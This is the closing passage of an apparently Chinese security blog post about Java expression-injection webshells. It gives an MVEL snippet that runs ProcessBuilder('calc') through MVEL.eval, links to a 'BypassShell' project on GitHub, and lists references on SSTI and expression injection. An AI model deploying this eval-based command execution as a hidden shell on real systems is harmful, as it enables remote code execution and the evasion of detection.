<a class="reference-link" name="Elasticsearch%E2%80%94%E2%80%94MVEL"></a>**Elasticsearch——MVEL**

```
&lt;dependency&gt;
    &lt;groupId&gt;org.mvel&lt;/groupId&gt;
    &lt;artifactId&gt;mvel2&lt;/artifactId&gt;
    &lt;version&gt;2.2.8.Final&lt;/version&gt;
&lt;/dependency&gt;
```

```
String exp = "a=123;new java.lang.ProcessBuilder("calc").start();";
Map vars = new HashMap();
vars.put("foobar", new Integer(100));
String result = MVEL.eval(exp, vars).toString();
```



## 最后

项目地址在：<br>[https://github.com/lufeirider/BypassShell/blob/master/JAVA/JAVA.md](https://github.com/lufeirider/BypassShell/blob/master/JAVA/JAVA.md)<br>
还有整理了ASP和PHP两种语言。



## 参考

[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/)<br>[https://wsygoogol.github.io/2016/11/15/MVEL%E8%A7%A3%E6%9E%90%E8%A1%A8%E8%BE%BE%E5%BC%8F/](https://wsygoogol.github.io/2016/11/15/MVEL%E8%A7%A3%E6%9E%90%E8%A1%A8%E8%BE%BE%E5%BC%8F/)<br>[https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/](https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/)<br>[https://wooyun.js.org/drops/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%8E%B0%E4%BB%A3WEB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%A1%A5%E5%85%85%E7%BF%BB%E8%AF%91%E5%92%8C%E6%89%A9%E5%B1%95%EF%BC%89.html](https://wooyun.js.org/drops/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%8E%B0%E4%BB%A3WEB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%A1%A5%E5%85%85%E7%BF%BB%E8%AF%91%E5%92%8C%E6%89%A9%E5%B1%95%EF%BC%89.html)<br>[http://rui0.cn/archives/1043](http://rui0.cn/archives/1043)
